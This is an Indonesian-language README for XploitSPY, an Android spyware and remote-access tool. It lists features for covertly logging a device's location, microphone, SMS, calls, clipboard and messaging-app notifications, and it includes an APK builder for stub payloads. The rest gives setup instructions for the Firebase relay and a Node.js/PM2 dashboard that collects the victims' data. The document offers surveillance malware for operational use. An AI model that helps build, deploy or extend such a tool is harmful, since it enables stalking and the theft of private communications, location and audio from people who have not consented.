# XploitSPY

Aplikasi monitoring dan logging untuk perangkat Android dengan fitur lengkap.

## Fitur

- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail dan lainnya)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Device Admin
- Built In APK Builder

**Quick Setup:**

```bash
# Setup Git repository dengan security yang baik
./scripts/setup-git-secure.sh

# Pastikan repository GitHub Anda adalah PRIVATE
# Pastikan semua collaborator hanya memiliki READ access (bukan Write!)
# Setup file sensitif dari template:
cp server/firebase-service-account.json.example server/firebase-service-account.json
cp client/app/google-services.json.example client/app/google-services.json
# Edit file dan isi dengan kredensial Anda
```

## Prerequisites

- Java Runtime Environment 11 atau lebih tinggi
- NodeJs
- Server dengan Static IP Address
- Firebase Account (untuk monitoring tanpa USB)
- Android Device dengan koneksi Internet (WiFi atau Mobile Data)

## ⚡ Monitoring Tanpa USB

Aplikasi ini dirancang untuk monitoring **tanpa perlu colok USB**. Data dikirim dari Android device ke Firebase Cloud, kemudian server sync ke database dan ditampilkan di web dashboard secara realtime.

**Alur Data:**

```
Android Device → Firebase Firestore → Node.js Server → Web Dashboard
     (Internet)        (Cloud)          (SQLite)        (Browser)
```

📖 **Lihat dokumentasi lengkap:** [FIREBASE_DATA_FLOW.md](./FIREBASE_DATA_FLOW.md)

## Instalasi

### Install JRE 11

**Debian, Ubuntu, dll:**

```bash
sudo apt-get install openjdk-11-jre
```

### Install NodeJS

Ikuti instruksi di [NodeJS Official Website](https://nodejs.org/) (Jika Anda tidak bisa melakukan ini, sebaiknya jangan menggunakan aplikasi ini)

### Install PM2

```bash
sudo npm install pm2 -g
```

### Clone Repository

```bash
git clone https://github.com/XploitWizer/XploitSPY.git
cd XploitSPY/server/
```

### Setup Server

```bash
npm install  # install dependencies
pm2 start index.js  # start the script
pm2 startup  # untuk menjalankan XploitSPY saat startup
```

### Mengelola Service Web

#### Menggunakan NPM Scripts (Disarankan)

**Menjalankan Server:**

```bash
cd server
npm run pm2:start        # Start di port 3000 (default)
npm run pm2:start:80    # Start di port 80 (perlu root)
```

**Menghentikan Server:**

```bash
cd server
npm run pm2:stop
```

**Restart Server:**

```bash
cd server
npm run pm2:restart
```

**Melihat Status Server:**

```bash
cd server
npm run pm2:status
```

**Melihat Logs Server:**

```bash
cd server
npm run pm2:logs
```

#### Menggunakan PM2 Langsung

**Menjalankan Server:**

```bash
pm2 start server/index.js --name xploitspy
```

**Menghentikan Server:**

```bash
pm2 stop xploitspy
# atau stop semua
pm2 stop all
```

**Menghapus dari PM2:**

```bash
pm2 delete xploitspy
# atau hapus semua
pm2 delete all
```

**Melihat Status:**

```bash
pm2 status
```

**Melihat Logs:**

```bash
pm2 logs xploitspy
```

**Catatan:**

- `pm2 stop` = menghentikan sementara (bisa di-start lagi)
- `pm2 delete` = menghapus dari PM2 (harus start ulang)
- `pm2 kill` = menghentikan semua PM2 daemon

### Service yang Berjalan

**1. PM2 Daemon (God Daemon)**

- Service PM2 itu sendiri yang selalu berjalan untuk mengelola proses
- Tidak perlu dihentikan kecuali ingin menghentikan semua PM2
- Untuk menghentikan: `pm2 kill`

**2. XploitSPY Server**

- Service utama aplikasi (Node.js server)
- Berjalan di port 3000 (default) atau port 80
- Dikelola melalui PM2 dengan nama `xploitspy`

**Melihat Semua Service:**

```bash
# Melihat semua proses PM2
pm2 list
# atau
pm2 status

# Melihat semua proses Node.js
ps aux | grep node

# Melihat port yang digunakan
lsof -i -P -n | grep LISTEN
```

**Menghentikan Semua Service:**

```bash
# Hentikan semua proses PM2
pm2 stop all

# Hapus semua dari PM2
pm2 delete all

# Hentikan PM2 daemon (akan menghentikan semua)
pm2 kill
```

### Akses Dashboard

Cari IP publik Anda:

```bash
curl ifconfig.me
```

Di browser, navigasi ke Server Static IP Address Anda, contoh: `http://192.168.55.203`

**Login details:**

- Username: `admin`
- Password: `password`

## Troubleshooting

### Product Name Menampilkan "Unknown"

Jika Product Name di dashboard menampilkan "Unknown", device perlu re-register dengan product name baru.

**Cara 1: Restart Aplikasi (Paling Mudah)**

```bash
# Force stop aplikasi
adb shell am force-stop com.xploitspy.client

# Start aplikasi lagi
adb shell am start -n com.xploitspy.client/.MainActivity
```

**Cara 2: Install APK Baru**

```bash
cd client
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

**Cara 3: Update Manual di Database (Jika perlu)**

```bash
cd server
sqlite3 data/xploitspy.db "UPDATE devices SET product_name = 'PRODUCT_NAME' WHERE device_id = 'DEVICE_ID';"
```

Setelah restart, refresh dashboard dan Product Name akan muncul dengan benar.
